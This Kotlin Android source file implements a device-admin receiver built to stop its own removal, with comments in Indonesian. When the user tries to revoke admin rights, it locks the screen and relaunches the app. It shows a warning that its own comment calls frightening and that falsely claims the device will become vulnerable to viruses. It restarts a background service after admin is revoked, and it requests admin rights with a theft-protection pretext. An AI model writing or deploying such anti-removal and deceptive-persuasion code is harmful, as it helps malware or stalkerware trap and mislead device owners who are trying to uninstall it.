package com.fantzy.nih

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

class AntiUninstallReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Log.d("DeviceAdmin", "Device Admin AKTIF")
    }

    // ====================================================================
    // GABUNGAN ANTI-UNINSTALL: BUKA APP + LANGSUNG KUNCI LAYAR SEKALIGUS
    // ====================================================================
    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        Log.w("DeviceAdmin", "Seseorang mencoba mencabut Device Admin!")

        // 1. Langsung kunci layar HP (Logika Vinigini)
        try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val comp = ComponentName(context, AntiUninstallReceiver::class.java)
            if (dpm.isAdminActive(comp)) {
                dpm.lockNow()
            }
        } catch (e: Exception) {
            Log.e("DeviceAdmin", "Gagal lock saat disable req: ${e.message}")
        }

        // 2. Buka kembali aplikasi ke depan (Logika Asli Anda)
        try {
            val launch = context.packageManager
                .getLaunchIntentForPackage(context.packageName)?.apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
            if (launch != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    val pending = android.app.PendingIntent.getActivity(
                        context, 0, launch,
                        android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
                    )
                    pending.send()
                } else {
                    context.startActivity(launch)
                }
            }
        } catch (e: Exception) {
            Log.e("DeviceAdmin", "Gagal buka app saat disable req: ${e.message}")
        }

        // 3. Tampilkan peringatan menakutkan
        return "PERINGATAN: Menonaktifkan ini akan membuat perangkat TIDAK AMAN dan rentan terhadap virus. Aplikasi akan mengunci perangkat sebagai tindakan keamanan."
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        Log.w("DeviceAdmin", "Device Admin telah dicabut paksa!")
        
        // Pastikan Service utama tetap hidup walau admin dicabut
        try {
            val svcIntent = Intent(context, DeviceService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(svcIntent)
            } else {
                context.startService(svcIntent)
            }
        } catch (e: Exception) {
            Log.e("DeviceAdmin", "Gagal restart service: ${e.message}")
        }
    }

    override fun onPasswordFailed(context: Context, intent: Intent) {
        super.onPasswordFailed(context, intent)
    }

    override fun onPasswordSucceeded(context: Context, intent: Intent) {
        super.onPasswordSucceeded(context, intent)
    }

    // ====================================================================
    // COMPANION OBJECT: WAJIB ADA (Dipakai oleh fungsi Restart, Wipe, dll)
    // ====================================================================
    companion object {
        fun isAdminActive(context: Context): Boolean {
            return try {
                val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val comp = ComponentName(context, AntiUninstallReceiver::class.java)
                dpm.isAdminActive(comp)
            } catch (e: Exception) {
                false
            }
        }

        fun requestAdminIfNeeded(context: Context) {
            if (isAdminActive(context)) return
            try {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                val comp = ComponentName(context, AntiUninstallReceiver::class.java)
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp)
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk mengamankan perangkat dari pencurian.")
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
            } catch (e: Exception) {
                Log.e("DeviceAdmin", "Gagal request admin: ${e.message}")
            }
        }
    }
}